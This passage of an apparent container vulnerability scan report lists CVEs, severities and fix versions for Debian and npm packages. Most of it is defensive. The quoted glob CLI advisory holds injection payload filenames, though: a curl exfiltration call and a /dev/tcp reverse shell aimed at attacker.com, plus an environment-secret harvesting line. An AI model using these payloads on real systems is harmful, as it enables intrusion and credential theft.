<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>sqlite3</strong> <code>3.40.1-2</code> (deb)</summary>

<small><code>pkg:deb/debian/sqlite3@3.40.1-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-6965?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.40.1-2%2Bdeb12u2"><img alt="high : CVE--2025--6965" src="https://img.shields.io/badge/CVE--2025--6965-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.40.1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.40.1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There exists a vulnerability in SQLite versions before 3.50.2 where the number of aggregate terms could exceed the number of columns available. This could lead to a memory corruption issue. We recommend upgrading to version 3.50.2 or above.

---
- sqlite3 3.46.1-7 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109379)
[bookworm] - sqlite3 3.40.1-2+deb12u2
[bullseye] - sqlite3 <postponed> (Minor issue)
https://github.com/google/security-research/security/advisories/GHSA-qj7j-3jp8-8ccv
https://www.sqlite.org/src/info/5508b56fd24016c13981ec280ecdd833007c9d8dd595edb295b984c2b487b5c8

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-7104?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.40.1-2%2Bdeb12u1"><img alt="medium : CVE--2023--7104" src="https://img.shields.io/badge/CVE--2023--7104-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.40.1-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.40.1-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.129%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in SQLite SQLite3 up to 3.43.0 and classified as critical. This issue affects the function sessionReadRecord of the file ext/session/sqlite3session.c of the component make alltest Handler. The manipulation leads to heap-based buffer overflow. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-248999.

---
- sqlite3 3.43.1-1
[bookworm] - sqlite3 3.40.1-2+deb12u1
[buster] - sqlite3 <no-dsa> (Minor issue)
https://sqlite.org/forum/forumpost/5bcbf4571c
Fixed by: https://sqlite.org/src/info/0e4e7a05c4204b47

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-29088?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.40.1-2%2Bdeb12u2"><img alt="low : CVE--2025--29088" src="https://img.shields.io/badge/CVE--2025--29088-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.40.1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In SQLite 3.49.0 before 3.49.1, certain argument values to sqlite3_db_config (in the C-language API) can cause a denial of service (application crash). An sz*nBig multiplication is not cast to a 64-bit integer, and consequently some memory allocations may be incorrect.

---
- sqlite3 3.46.1-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1102670; unimportant)
https://github.com/sqlite/sqlite/commit/56d2fd008b108109f489339f5fd55212bb50afd4
https://sqlite.org/src/info/1ec4c308c76c69fb
OOB to setup API; API in question is only accessible from programms that invoke
SQLite. Not reachable from rouge SQL inputs or specially crafted database files.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-45346?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.40.1-2%2Bdeb12u2"><img alt="low : CVE--2021--45346" src="https://img.shields.io/badge/CVE--2021--45346-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.40.1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.378%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Memory Leak vulnerability exists in SQLite Project SQLite3 3.35.1 and 3.37.0 via maliciously crafted SQL Queries (made via editing the Database File), it is possible to query a record, and leak subsequent bytes of memory that extend beyond the record, which could let a malicious user obtain sensitive information. NOTE: The developer disputes this as a vulnerability stating that If you give SQLite a corrupted database file and submit a query against the database, it might read parts of the database that you did not intend or expect.

---
- sqlite3 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005974)
- sqlite <removed> (unimportant)
https://github.com/guyinatuxedo/sqlite3_record_leaking
https://bugzilla.redhat.com/show_bug.cgi?id=2054793
https://sqlite.org/forum/forumpost/056d557c2f8c452ed5bb9c215414c802b215ce437be82be047726e521342161e
Negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pam</strong> <code>1.5.2-6+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/pam@1.5.2-6%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-6020?s=debian&n=pam&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.5.2-6%2Bdeb12u2"><img alt="high : CVE--2025--6020" src="https://img.shields.io/badge/CVE--2025--6020-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.5.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.037%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in linux-pam. The module pam_namespace may use access user-controlled paths without proper protection, allowing local users to elevate their privileges to root via multiple symlink attacks and race conditions.

---
[experimental] - pam 1.7.0-4
- pam 1.7.0-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1107919)
[bookworm] - pam 1.5.2-6+deb12u2
https://www.openwall.com/lists/oss-security/2025/06/17/1
https://github.com/linux-pam/linux-pam/security/advisories/GHSA-f9p8-gjr4-j9gx
Fixed by: https://github.com/linux-pam/linux-pam/commit/475bd60c552b98c7eddb3270b0b4196847c0072e (v1.7.1)
Fixed by: https://github.com/linux-pam/linux-pam/commit/592d84e1265d04c3104acee815a503856db503a1 (v1.7.1)
Fixed by: https://github.com/linux-pam/linux-pam/commit/976c20079358d133514568fc7fd95c02df8b5773 (v1.7.1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-22365?s=debian&n=pam&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.5.2-6%2Bdeb12u2"><img alt="medium : CVE--2024--22365" src="https://img.shields.io/badge/CVE--2024--22365-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.5.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.

---
[experimental] - pam 1.5.3-2
- pam 1.5.3-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1061097)
[bookworm] - pam 1.5.2-6+deb12u2
[buster] - pam <no-dsa> (Minor issue)
https://www.openwall.com/lists/oss-security/2024/01/18/3
https://github.com/linux-pam/linux-pam/commit/031bb5a5d0d950253b68138b498dc93be69a64cb (v1.6.0)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>ip</strong> <code>2.0.0</code> (npm)</summary>

<small><code>pkg:npm/ip@2.0.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-29415?s=github&n=ip&t=npm&vr=%3C%3D2.0.1"><img alt="high 8.1: CVE--2024--29415" src="https://img.shields.io/badge/CVE--2024--29415-lightgrey?label=high%208.1&labelColor=e25d68"/></a> <i>Server-Side Request Forgery (SSRF)</i>

<table>
<tr><td>Affected range</td><td><code><=2.0.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.916%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-42282?s=github&n=ip&t=npm&vr=%3D2.0.0"><img alt="low : CVE--2023--42282" src="https://img.shields.io/badge/CVE--2023--42282-lightgrey?label=low%20&labelColor=fce1a9"/></a> <i>Server-Side Request Forgery (SSRF)</i>

<table>
<tr><td>Affected range</td><td><code>=2.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.0.1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.554%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The `isPublic()` function in the NPM package `ip` doesn't correctly identify certain private IP addresses in uncommon formats such as `0x7F.1` as private. Instead, it reports them as public by returning `true`. This can lead to security issues such as Server-Side Request Forgery (SSRF) if `isPublic()` is used to protect sensitive code paths when passed user input. Versions 1.1.9 and 2.0.1 fix the issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>gnupg2</strong> <code>2.2.40-1.1</code> (deb)</summary>

<small><code>pkg:deb/debian/gnupg2@2.2.40-1.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68973?s=debian&n=gnupg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.2.40-1.1%2Bdeb12u2"><img alt="high : CVE--2025--68973" src="https://img.shields.io/badge/CVE--2025--68973-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.2.40-1.1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.2.40-1.1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GnuPG before 2.4.9, armor_filter in g10/armor.c has two increments of an index variable where one is intended, leading to an out-of-bounds write for crafted input. (For ExtendedLTS, 2.2.51 and later are fixed versions.)

---
- gnupg2 2.4.8-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1124221)
[trixie] - gnupg2 2.4.7-21+deb13u1
[bookworm] - gnupg2 2.2.40-1.1+deb12u2
https://gpg.fail/memcpy
https://dev.gnupg.org/T7906
https://www.openwall.com/lists/oss-security/2025/12/28/5
https://github.com/gpg/gnupg/commit/115d138ba599328005c5321c0ef9f00355838ca9 (gnupg-2.5.14)
https://github.com/gpg/gnupg/commit/4ecc5122f20e10c17172ed72f4fa46c784b5fb48 (gnupg-2.4.9)
https://github.com/gpg/gnupg/commit/1e929abd20fa2e4be3797a137caca63a971d5372 (gnupg-2.2.51)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-3219?s=debian&n=gnupg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.2.40-1.1%2Bdeb12u2"><img alt="low : CVE--2022--3219" src="https://img.shields.io/badge/CVE--2022--3219-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.2.40-1.1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.

---
- gnupg2 <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2127010
https://dev.gnupg.org/D556
https://dev.gnupg.org/T5993
https://www.openwall.com/lists/oss-security/2022/07/04/8
GnuPG upstream is not implementing this change.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>glob</strong> <code>10.3.3</code> (npm)</summary>

<small><code>pkg:npm/glob@10.3.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-64756?s=github&n=glob&t=npm&vr=%3E%3D10.2.0%2C%3C10.5.0"><img alt="high 7.5: CVE--2025--64756" src="https://img.shields.io/badge/CVE--2025--64756-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code>>=10.2.0<br/><10.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.5.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.044%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.

### Details

**Root Cause:**
The vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:

```javascript
stream.on('end', () => foregroundChild(cmd, matches, { shell: true }))
```

**Technical Flow:**
1. User runs `glob -c <command> <pattern>` 
2. CLI finds files matching the pattern
3. Matched filenames are collected into an array
4. Command is executed with matched filenames as arguments using `shell: true`
5. Shell interprets metacharacters in filenames as command syntax
6. Malicious filenames execute arbitrary commands

**Affected Component:**
- **CLI Only:** The vulnerability affects only the command-line interface
- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected
- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)

**Attack Surface:**
- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.
- Any directory where attackers can control filenames (PR branches, archives, user uploads)
- CI/CD pipelines using `glob -c` on untrusted content

### PoC

**Setup Malicious File:**
```bash
mkdir test_directory && cd test_directory

# Create file with command injection payload in filename
touch '$(touch injected_poc)'
```

**Trigger Vulnerability:**
```bash
# Run glob CLI with -c option
node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"
```

**Result:**
- The echo command executes normally
- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell
- A new file `injected_poc` is created, proving command execution
- Any command can be injected this way with full user privileges

**Advanced Payload Examples:**

**Data Exfiltration:**
```bash
# Filename: $(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)
touch '$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)'
```

**Reverse Shell:**
```bash
# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
touch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
```

**Environment Variable Harvesting:**
```bash
# Filename: $(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)
touch '$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)'
```

### Impact

**Arbitrary Command Execution:**
- Commands execute with full privileges of the user running glob CLI
- No privilege escalation required - runs as current user
- Access to environment variables, file system, and network

**Real-World Attack Scenarios:**

**1. CI/CD Pipeline Compromise:**
- Malicious PR adds files with crafted names to repository
- CI pipeline uses `glob -c` to process files (linting, testing, deployment)
- Commands execute in CI environment with build secrets and deployment credentials
- Potential for supply chain compromise through artifact tampering

**2. Developer Workstation Attack:**
- Developer clones repository or extracts archive containing malicious filenames
- Local build scripts use `glob -c` for file processing
- Developer machine compromise with access to SSH keys, tokens, local services

**3. Automated Processing Systems:**
- Services using glob CLI to process uploaded files or external content
- File uploads with malicious names trigger command execution
- Server-side compromise with potential for lateral movement

**4. Supply Chain Poisoning:**
- Malicious packages or themes include files with crafted names
- Build processes using glob CLI automatically process these files
- Wide distribution of compromise through package ecosystems

**Platform-Specific Risks:**
- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing
- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL
- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform

### Affected Products

- **Ecosystem:** npm
- **Package name:** glob
- **Component:** CLI only (`src/bin.mts`)
- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)
- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)
- **Patched versions:** 11.1.0and 10.5.0

**Scope Limitation:**
- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe
- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable

### Remediation

- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.
- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.
- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>icu</strong> <code>72.1-3</code> (deb)</summary>

<small><code>pkg:deb/debian/icu@72.1-3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5222?s=debian&n=icu&ns=debian&t=deb&osn=debian&osv=12&vr=%3C72.1-3%2Bdeb12u1"><img alt="high : CVE--2025--5222" src="https://img.shields.io/badge/CVE--2025--5222-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><72.1-3+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>72.1-3+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A stack buffer overflow was found in Internationl components for unicode (ICU ). While running the genrb binary, the 'subtag' struct overflowed at the SRBRoot::addTag function. This issue may lead to memory corruption and local arbitrary code execution.

---
- icu 76.1-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106684)
https://unicode-org.atlassian.net/browse/ICU-22957
Fixed by: https://github.com/unicode-org/icu/commit/2c667e31cfd0b6bb1923627a932fd3453a5bac77 (release-77-rc)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>freetype</strong> <code>2.12.1+dfsg-5</code> (deb)</summary>

<small><code>pkg:deb/debian/freetype@2.12.1%2Bdfsg-5?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-27363?s=debian&n=freetype&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.12.1%2Bdfsg-5%2Bdeb12u4"><img alt="high : CVE--2025--27363" src="https://img.shields.io/badge/CVE--2025--27363-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.12.1+dfsg-5+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>2.12.1+dfsg-5+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>76.675%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An out of bounds write exists in FreeType versions 2.13.0 and below (newer versions of FreeType are not vulnerable) when attempting to parse font subglyph structures related to TrueType GX and variable font files. The vulnerable code assigns a signed short value to an unsigned long and then adds a static value causing it to wrap around and allocate too small of a heap buffer. The code then writes up to 6 signed long integers out of bounds relative to this buffer. This may result in arbitrary code execution. This vulnerability may have been exploited in the wild.

---
- freetype 2.13.1+dfsg-1
https://www.facebook.com/security/advisories/cve-2025-27363
https://gitlab.freedesktop.org/freetype/freetype/-/issues/1322
Requisite (macro fixup for FT_Q(RE)NEW_ARRAY): https://gitlab.freedesktop.org/freetype/freetype/-/commit/c71eb22dde1a3101891a865fdac20a6de814267d (VER-2-11-1)
Fixed by: https://gitlab.freedesktop.org/freetype/freetype/-/commit/ef636696524b081f1b8819eb0c6a0b932d35757d (VER-2-13-1)
Followup: https://gitlab.freedesktop.org/freetype/freetype/-/commit/73720c7c9958e87b3d134a7574d1720ad2d24442 (VER-2-13-3)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>cross-spawn</strong> <code>7.0.3</code> (npm)</summary>

<small><code>pkg:npm/cross-spawn@7.0.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-21538?s=github&n=cross-spawn&t=npm&vr=%3E%3D7.0.0%2C%3C7.0.5"><img alt="high 7.7: CVE--2024--21538" src="https://img.shields.io/badge/CVE--2024--21538-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=7.0.0<br/><7.0.5</code></td></tr>
<tr><td>Fixed version</td><td><code>7.0.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 7" src="https://img.shields.io/badge/M-7-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>mariadb</strong> <code>1:10.11.4-1~deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/mariadb@1%3A10.11.4-1~deb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-30693?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.13-0%2Bdeb12u1"><img alt="medium : CVE--2025--30693" src="https://img.shields.io/badge/CVE--2025--30693-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.093%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Vulnerability in the MySQL Server product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are 8.0.0-8.0.41, 8.4.0-8.4.4 and  9.0.0-9.2.0. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server as well as  unauthorized update, insert or delete access to some of MySQL Server accessible data. CVSS 3.1 Base Score 5.5 (Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:H).

---
- mysql-8.0 8.0.42-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1103385)
- mariadb 1:11.8.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1105976)
[bookworm] - mariadb 1:10.11.13-0+deb12u1
- mariadb-10.5 <removed>
Fixed in MariaDB: 11.4.6, 10.6.22, 10.5.29, 10.11.12
MariaDB bug: https://jira.mariadb.org/browse/MDEV-36613
MariaDB commit: https://github.com/MariaDB/server/commit/1c9f64e54ffb109bb6cf6a189e863bfa54e46510 (mariadb-10.5.29)
Breaks compatibility with MySQL 5.7
MySQL commit [1/2]: https://github.com/mysql/mysql-server/commit/e00328b4d068c7485ac2ffe27207ed1f462c718d (mysql-8.0.42)
MySQL commit [2/2]: https://github.com/mysql/mysql-server/commit/808f6bfc22d034f7efb9eb9b2acc8e502b4946c8 (mysql-8.0.42)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-30722?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.13-0%2Bdeb12u1"><img alt="medium : CVE--2025--30722" src="https://img.shields.io/badge/CVE--2025--30722-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.110%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Vulnerability in the MySQL Client product of Oracle MySQL (component: Client: mysqldump).  Supported versions that are affected are 8.0.0-8.0.41, 8.4.0-8.4.4 and  9.0.0-9.2.0. Difficult to exploit vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Client.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all MySQL Client accessible data as well as  unauthorized update, insert or delete access to some of MySQL Client accessible data. CVSS 3.1 Base Score 5.9 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N).

---
- mysql-8.0 8.0.42-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1103385)
- mariadb 1:11.8.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1105976)
